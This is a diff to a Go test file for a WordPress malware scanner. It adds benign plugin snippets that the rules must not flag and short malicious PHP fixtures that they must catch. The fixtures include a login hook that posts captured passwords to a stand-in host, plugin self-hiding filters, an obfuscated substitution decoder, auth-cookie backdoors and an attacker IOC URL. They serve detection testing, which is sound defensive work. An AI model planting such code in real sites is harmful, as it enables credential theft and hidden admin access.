@@ -385,6 +385,12 @@ func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
 		"<?php\n/* Check $_SERVER['LOCAL_ADDR'] (for IIS servers). */\n$ip = $_SERVER['SERVER_ADDR'] ?? '';\n")
 	write(t, dir, "plugins/import-users-from-csv-with-meta/classes/export.php",
 		"<?php\n$roles = array_filter( $_POST['role'] );\n$running = array_filter( $_GET['already_running_backup'], self::class . '::sanitize_running_backup' );\n")
+	write(t, dir, "plugins/woocommerce/includes/admin/reports/class-wc-report-sales-by-product.php",
+		"<?php\n$ids = array_filter( array_map( 'absint', $_GET['product_ids'] ) );\n")
+	write(t, dir, "plugins/bdthemes-prime-slider-lite/admin/admin.php",
+		"<?php\nforeach ( $wp_list_table->items as $key => $val ) { if ( $key === 'bdthemes-prime-slider/bdthemes-prime-slider.php' && $this->white_label() ) { unset( $wp_list_table->items[ $key ] ); } }\n")
+	write(t, dir, "plugins/wp-phpmyadmin-extension/library.php",
+		"<?php\nfunction rand_str($length) { $x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $y = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; return substr(str_shuffle(str_repeat($x, ceil($length/strlen($x)))), 1, $length); }\n$t = strtr($s, $m); $d = base64_decode($t);\n")
 	write(t, dir, "plugins/fusion-builder/inc/class-fusion-form-auth-actions.php",
 		"<?php\n$user = wp_signon( array( 'user_login' => $_POST['user'], 'user_password' => $_POST['pass'] ) );\nif ( ! is_wp_error( $user ) ) { wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
 	write(t, dir, "plugins/jetpack/extensions/blocks/premium-content/_inc/subscription-service/class-jwt.php",
@@ -547,6 +553,13 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"uploads/2024/login.php":         {"<?php if ($_GET['k'] === 'x') { wp_set_auth_cookie(1, true); }", "unauth-admin-login"},
 		"themes/t/inc/helpers.php":       {"<?php add_action('init', function () { if (isset($_GET['tk']) && $_GET['tk'] === 'z') { $u = get_users(['role' => 'administrator', 'number' => 1]); wp_set_auth_cookie($u[0]->ID, true); } });", "theme-auth-cookie-backdoor"},
 		"themes/t/footer.php":            {"<?php wp_footer(); ?><script>eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))</script>", "js-eval-decoded"},
+		"plugins/x/images/ysosheb.png":   {"PNG" + strings.Repeat("K25y1jIkuB4y1ZNeB25bnGM8X", 60), "image-file-is-text"},
+		"plugins/x/loader.php":           {"<?php include_once __DIR__ . \"/suh\" . \"ashu.\" . \"php\"; include_once __DIR__ . \"/toreh\" . \"yb.php\";", "split-path-include"},
+		"plugins/x/decoder.php":          {"<?php class d { static function f($s) { $a = \"URv4WLkh50+AXzpsKnJqf1G/m8drOD3tlYBINbPxaHo97QV=yC6jSFiw2ZMeucgET\"; $b = \"WJvBT+gSx4byalLqYZorpcm7uj1nFUkwtPXM95E6NQDf8iOshz/3CKRH2GV0de=AI\"; $m = array(); for ($i = 0; $i < 64; $i++) { $m[$a[$i]] = $b[$i]; } return base64_decode(strtr($s, $m)); } }", "alphabet-substitution-decoder"},
+		"plugins/x/hide.php":             {"<?php function h($p) { if (in_array('x/x.php', array_keys($p))) { unset($p['x/x.php']); } return $p; } add_filter('all_plugins', 'h');", "plugin-self-hiding"},
+		"plugins/x/hide2.php":            {"<?php function g() { global $wp_list_table; foreach ($wp_list_table->items as $k => $v) { if ($k === 'x/x.php') { unset($wp_list_table->items[$k]); } } } add_action('pre_current_active_plugins', 'g');", "plugin-self-hiding"},
+		"plugins/x/ioc.php":              {"<?php $u = 'https://badping.info/SMILODON/index_logg.php?view=1';", "smilodon-toolkit-iocs"},
+		"plugins/x/stealer.php":          {"<?php add_action('wp_login', function ($login, $user) { $pwd = $_POST['pwd']; wp_remote_post('https://example.invalid/l', array('body' => array('u' => $login, 'p' => $pwd))); }, 10, 2);", "login-hook-credential-exfil"},
 		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
 	}
 	for rel, c := range cases {
